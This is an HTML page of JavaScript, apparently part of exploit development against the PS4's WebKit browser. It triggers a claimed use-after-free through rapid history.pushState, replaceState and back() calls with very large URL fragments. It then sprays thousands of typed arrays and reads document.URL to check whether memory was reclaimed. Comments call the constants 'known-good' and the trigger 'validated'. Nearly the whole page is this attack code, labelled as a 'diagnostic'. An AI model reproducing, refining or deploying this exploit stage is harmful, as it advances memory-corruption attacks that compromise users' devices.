<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit â€“ Slot Offset & TypedArray Mapping</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
button { padding:10px; margin:5px; font-size:14px; }
#log { white-space:pre-wrap; margin-top:15px; max-height:500px; overflow:auto; }
</style>
</head>

<body>
<h2>Slot Offset & TypedArray Mapping (Diagnostic)</h2>

<button onclick="runTest()">RUN MAPPING TEST</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// -------------------------------------------------
// CONFIG (known-good values)
// -------------------------------------------------
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// -------------------------------------------------
// UAF TRIGGER (validated)
// -------------------------------------------------
async function triggerUAF(){
    let size = BASE;
    for(let i=0;i<UAF_ITERS;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// -------------------------------------------------
// SAFE READ WINDOW
// -------------------------------------------------
function snapshot(label){
    log(`[${label}] URL.length = ${document.URL.length}`);
    const offs = [0,32,64,96,128,256,512,1024];
    for(const o of offs){
        let v = document.URL.charCodeAt(o);
        log(`[${label}] charCodeAt(${o}) = ${v}`);
    }
}

// -------------------------------------------------
// MAIN TEST
// -------------------------------------------------
async function runTest(){
    logEl.textContent = "";
    log("=== TEST START ===");

    await triggerUAF();

    // Baseline
    snapshot("BASELINE");

    // Collapse fragment
    location.hash = "#B";
    await sleep(50);
    log(">>> FRAGMENT COLLAPSED <<<");
    snapshot("POST-COLLAPSE");

    // TypedArray candidates
    const candidates = [
        {name:"Uint8Array", ctor:Uint8Array},
        {name:"Uint16Array", ctor:Uint16Array},
        {name:"Uint32Array", ctor:Uint32Array},
        {name:"Float64Array", ctor:Float64Array},
    ];

    for(const c of candidates){
        log(`\n=== TESTING ${c.name} ===`);

        let arrs = [];
        for(let i=0;i<2000;i++){
            arrs.push(new c.ctor(0x20)); // slot-sized candidate
        }

        await sleep(30);
        snapshot(c.name);

        // keep arrays alive briefly
        await sleep(30);
        arrs = null;
    }

    log("\n=== TEST END ===");
}
</script>
</body>
</html>
